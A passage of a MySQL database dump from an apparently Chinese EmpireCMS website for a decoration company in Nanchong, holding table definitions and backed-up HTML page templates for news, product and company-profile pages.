  `num` int(10) unsigned NOT NULL DEFAULT '0',
  `isgood` tinyint(1) NOT NULL DEFAULT '0',
  `cid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tagtitle` char(60) NOT NULL DEFAULT '',
  `tagkey` char(100) NOT NULL DEFAULT '',
  `tagdes` char(255) NOT NULL DEFAULT '',
  `fclast` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`tagid`),
  UNIQUE KEY `tagname` (`tagname`),
  KEY `isgood` (`isgood`),
  KEY `cid` (`cid`),
  KEY `num` (`num`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewstags`
--

LOCK TABLES `libang_enewstags` WRITE;
/*!40000 ALTER TABLE `libang_enewstags` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewstags` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewstagsclass`
--

DROP TABLE IF EXISTS `libang_enewstagsclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewstagsclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` varchar(60) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewstagsclass`
--

LOCK TABLES `libang_enewstagsclass` WRITE;
/*!40000 ALTER TABLE `libang_enewstagsclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewstagsclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewstagsdata`
--

DROP TABLE IF EXISTS `libang_enewstagsdata`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewstagsdata` (
  `tid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `tagid` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
  `mid` smallint(5) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`tid`),
  KEY `tagid` (`tagid`),
  KEY `classid` (`classid`),
  KEY `id` (`id`),
  KEY `newstime` (`newstime`),
  KEY `mid` (`mid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewstagsdata`
--

LOCK TABLES `libang_enewstagsdata` WRITE;
/*!40000 ALTER TABLE `libang_enewstagsdata` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewstagsdata` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewstask`
--

DROP TABLE IF EXISTS `libang_enewstask`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewstask` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `taskname` varchar(60) NOT NULL DEFAULT '',
  `userid` int(10) unsigned NOT NULL DEFAULT '0',
  `isopen` tinyint(1) NOT NULL DEFAULT '0',
  `filename` varchar(60) NOT NULL DEFAULT '',
  `lastdo` int(10) unsigned NOT NULL DEFAULT '0',
  `doweek` char(1) NOT NULL DEFAULT '0',
  `doday` char(2) NOT NULL DEFAULT '0',
  `dohour` char(2) NOT NULL DEFAULT '0',
  `dominute` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewstask`
--

LOCK TABLES `libang_enewstask` WRITE;
/*!40000 ALTER TABLE `libang_enewstask` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewstask` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewstempbak`
--

DROP TABLE IF EXISTS `libang_enewstempbak`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewstempbak` (
  `bid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `tempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tempname` varchar(60) NOT NULL DEFAULT '',
  `temptext` mediumtext NOT NULL,
  `subnews` smallint(6) NOT NULL DEFAULT '0',
  `isdefault` tinyint(1) NOT NULL DEFAULT '0',
  `listvar` text NOT NULL,
  `rownum` smallint(6) NOT NULL DEFAULT '0',
  `modid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `showdate` varchar(50) NOT NULL DEFAULT '',
  `subtitle` smallint(6) NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `docode` tinyint(1) NOT NULL DEFAULT '0',
  `baktime` int(10) unsigned NOT NULL DEFAULT '0',
  `temptype` varchar(30) NOT NULL DEFAULT '',
  `gid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `lastuser` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`bid`),
  KEY `tempid` (`tempid`),
  KEY `temptype` (`temptype`),
  KEY `gid` (`gid`)
) ENGINE=MyISAM AUTO_INCREMENT=196 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewstempbak`
--

LOCK TABLES `libang_enewstempbak` WRITE;
/*!40000 ALTER TABLE `libang_enewstempbak` DISABLE KEYS */;
INSERT INTO `libang_enewstempbak` VALUES (133,4,'公司实力列表模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.pagination.js\\\"></script>\r\n   \r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<img src=\\\"/images/2019092011402622.jpg\\\" alt=\\\"\\\" />\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_pro\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_pro_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    \r\n\r\n                    [showclasstemp]5,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_pro_content\\\">\r\n            <div class=\\\"daohang\\\"><p>您的位置：[!--newsnav--]</div>\r\n            <ul >   \r\n            [!--empirenews.listtemp--]\r\n            <!--list.var1-->\r\n            [!--empirenews.listtemp--]\r\n           </ul>\r\n                \r\n\r\n\r\n           <div class=\\\"pageBox\\\">[!--show.listpage--]</div>\r\n           <style type=\\\"text/css\\\">\r\n            .pageBox {text-align: center; width:750px; margin-bottom:25px; margin-top:25px; }\r\n            .pageBox a {border:1px solid #ddd;display:inline-block;margin-right:6px;color: #707070;width:45px;height:34px;font:bold 14px/34px arial;}\r\n            .pageBox a:hover,.pageBox a:active{background:#3aa9f2;color: #FFFFFF;text-decoration: none;}\r\n            .pageBox .cur { background: #3aa9f2;border: 1px solid #3aa9f2;text-decoration: none;}\r\n            .pageBox a.cur {color: #fff;}\r\n            .pageBox .disabled {width: 79px;}\r\n</style>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',200,0,'<li>\r\n                <a href=\\\'[!--titleurl--]\\\'>\r\n                <img src=\\\'[!--titlepic--]\\\'>\r\n                </a>\r\n                <p>\r\n                <a href=\\\'[!--titleurl--]\\\'>[!--title--]</a>\r\n                </p>\r\n                </li>',1,1,'Y-m-d',0,0,0,1587100588,'listtemp',1,'admin'),(125,1,'子栏目导航标签模板','[!--empirenews.listtemp--]<!--list.var1-->[!--empirenews.listtemp--]',0,0,'<dd><a href=\\\'[!--classurl--]\\\'>[!--classname--]</a></dd>',1,1,'Y-m-d H:i:s',0,0,0,1587095916,'bqtemp',1,'admin'),(150,1,'新闻列表模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--] />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.pagination.js\\\"></script>\r\n\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<div><img src=\\\"/images/2019092011404080.jpg\\\" alt=\\\"\\\" /></div>\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_news_l_title.png\\\" alt=\\\"\\\"></dt>\r\n\r\n                    \r\n                    [showclasstemp]3,1,0,0[/showclasstemp]\r\n\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n\r\n        <div class=\\\"ny_news_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <ul class=\\\"news_list\\\">\r\n                \r\n\r\n\r\n                    [!--empirenews.listtemp--]\r\n                    <!--list.var1-->\r\n                    [!--empirenews.listtemp--]\r\n\r\n            </ul>\r\n           <div class=\\\"pageBox\\\">[!--show.listpage--]</div>\r\n           <style type=\\\"text/css\\\">\r\n            .pageBox {text-align: center; width:90%; margin-bottom:25px; margin-top:25px; }\r\n            .pageBox a {border:1px solid #ddd;display:inline-block;margin-right:6px;color: #707070;width:45px;height:34px;font:bold 14px/34px arial;}\r\n            .pageBox a:hover,.pageBox a:active{background:#3aa9f2;color: #FFFFFF;text-decoration: none;}\r\n            .pageBox .cur { background: #3aa9f2;border: 1px solid #3aa9f2;text-decoration: none;}\r\n            .pageBox a.cur {color: #fff;}\r\n            .pageBox .disabled {width: 79px;}\r\n</style>\r\n        </div>\r\n    </div>\r\n</div>\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',0,0,'                <li>\r\n                <span>[!--newstime--]</span>\r\n                <div class=\\\'news_txt2\\\' style=\\\"height: 82px\\\"><a href=\\\'[!--titleurl--]\\\'>[!--title--]</a><div class=\\\'clear\\\'></div>\r\n                <p>[!--smalltext--]...</p></div></li>',1,1,'Y-m-d',0,0,0,1587369828,'listtemp',1,'admin'),(179,3,'公司简介内容模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<div><img src=\\\"/images/2019092011405530.jpg\\\" alt=\\\"\\\" /></div>\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_about_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    [showclasstemp]2,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_news_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <div class=\\\"ny_newsdetial\\\">\r\n                <div class=\\\"news_name\\\">\r\n                    <h2>公司简介</h2>\r\n                    <p>&nbsp;</p>\r\n                </div>\r\n                <div class=\\\"prodetail22\\\">\r\n                    <p>\r\n	<br />\r\n</p>\r\n<p class=\\\"ldls\\\" style=\\\"text-indent:2em;\\\">\r\n	[!--newstext--]\r\n</p>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</div>\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',0,0,'',0,1,'Y-m-d H:i:s',0,0,0,1589783193,'newstemp',1,'admin'),(180,11,'企业文化内容模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<div><img src=\\\"/images/2019092011405530.jpg\\\" alt=\\\"\\\" /></div>\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_about_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    [showclasstemp]2,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_news_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <div class=\\\"ny_newsdetial\\\">\r\n                <div class=\\\"news_name\\\">\r\n                    <h2>企业文化</h2>\r\n                    <p>&nbsp;</p>\r\n                </div>\r\n                <div class=\\\"prodetail22\\\">\r\n                    <p>\r\n	<br />\r\n</p>\r\n<p class=\\\"ldls\\\" style=\\\"text-indent:2em;\\\">\r\n	[!--newstext--]\r\n</p>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</div>\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',0,0,'',0,1,'Y-m-d H:i:s',0,0,0,1589783240,'newstemp',1,'admin'),(151,1,'header','<div class=\\\"header\\\">\r\n    <div class=\\\"header_center\\\">\r\n        <h1 class=\\\"logo wow zoomIn\\\"><a href=\\\"/\\\"><img width=\\\"64px\\\" height=\\\"64px\\\" src=\\\"/images/logo.png\\\" title=\\\"南充市丽邦装饰工程有限公司\\\" alt=\\\"南充市丽邦装饰工程有限公司\\\" /><img class=\\\"logo_txt\\\" src=\\\"/images/logo_txt.png\\\" alt=\\\"\\\"></a></h1>\r\n        <div class=\\\"tel\\\">\r\n            <p>15196780978</p>\r\n            <p>18190610788</p>\r\n            <span>0817-3618388</span>\r\n        </div>\r\n       \r\n<div class=\\\"mune\\\">\r\n            \r\n    </div>\r\n    </div>\r\n    <div class=\\\"nav_bg\\\">\r\n        <div class=\\\"nav\\\">\r\n            <ul>\r\n                <li class=\\\"nav_active\\\"><a href=\\\"/\\\">网站首页</a></li>\r\n                <li><a href=\\\"/cpzx/gnxdp/\\\">产品中心</a></li>\r\n                <li><a href=\\\"/gywm/gsjj/\\\">关于我们</a></li>\r\n                <li><a href=\\\"/xwzx/qyzx/\\\">新闻资讯</a></li>\r\n                <li><a href=\\\"/gcal/zxal/\\\">最新案例</a></li>\r\n                <li><a href=\\\"/gcal/jdal/\\\">经典案例</a></li>\r\n                <li><a href=\\\"/gssl/ryzz/\\\">公司实力</a></li>\r\n                <li><a href=\\\"/lxwm/\\\">联系我们</a></li>\r\n            </ul>\r\n        </div>\r\n    </div>\r\n</div>',1,0,'页面头部',0,0,'',0,0,0,1587609131,'tempvar',1,'admin'),(184,2,'产品内容模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<img src=\\\"/images/2019092011402622.jpg\\\" alt=\\\"\\\" />\r\n\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n\r\n\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_pro\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_pro_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    [showclasstemp]1,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n           [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_pro_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <div class=\\\"ny_prodetail_txt\\\">\r\n                <img src=\\\"[!--titlepic--]\\\" alt=\\\"[!--title--]\\\" />\r\n                <div class=\\\"shuoming\\\">\r\n                    <span>[!--title--]</span><br/>\r\n                    <p>[!--smalltext--]</p>\r\n                    <i><font>咨询热线：</font>0817-3618388</i>\r\n                </div>\r\n            </div>\r\n            <div class=\\\"ny_prodetail_txt2\\\">\r\n                <div class=\\\"ny_detailtxt_content\\\">\r\n                    <div class=\\\"ny_detailtxt_i\\\"><p></p></div>\r\n                    <p>\r\n                       [!--newstext--]\r\n                    </p>\r\n                </div>\r\n            </div>\r\n            \r\n            <div class=\\\"sx\\\">\r\n                <div style=\\\" text-align:left; float:left; width:49%; margin-left:1%; line-height:40px;\\\">\r\n                    上一篇：[!--info.pre--]</div>\r\n                <div style=\\\" text-align:right; float:right; width:49%; margin-right:1%; line-height:40px;\\\">\r\n                    下一篇：[!--info.next--]</div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n\r\n</body>\r\n</html>\r\n',0,0,'',0,1,'Y-m-d',0,0,0,1589788672,'newstemp',1,'admin'),(116,1,'新闻内容模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" 